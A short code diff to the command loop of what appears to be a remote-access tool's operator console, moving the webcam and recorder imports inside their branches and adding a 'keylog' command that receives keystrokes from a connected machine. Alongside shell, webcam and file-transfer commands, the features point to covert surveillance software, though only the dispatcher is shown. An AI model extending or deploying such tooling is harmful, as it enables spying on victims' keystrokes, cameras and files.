@@ -1,10 +1,8 @@
 from server import Server
 from prompt import InteractivePrompt
-from webcam import Webcam
 from shell import Shell
 from transfer import FileTransfer
 from outputs import Output
-from recorder import Player
 import signal
 import sys
 import os
@@ -33,6 +31,7 @@ def main_loop(server):
 			shell.listener()
 		# Rework webcam to be more comprehensible
 		elif cmd == "webcam":
+			from webcam import Webcam
 			webcam = Webcam(server)
 			webcam.receive()
 		elif cmd == "download":
@@ -53,8 +52,13 @@ def main_loop(server):
 			else:
 				Output.success(f"Successfully uploaded {args[0]}")
 		elif cmd == "record":
+			from recorder import Player
 			player = Player(server)
 			player.play()
+		elif cmd == "keylog":
+			from keylogger import Keylogger
+			keylogger = Keylogger(server)
+			keylogger.receive()
 		elif cmd == "exit":
 			return
 		else:
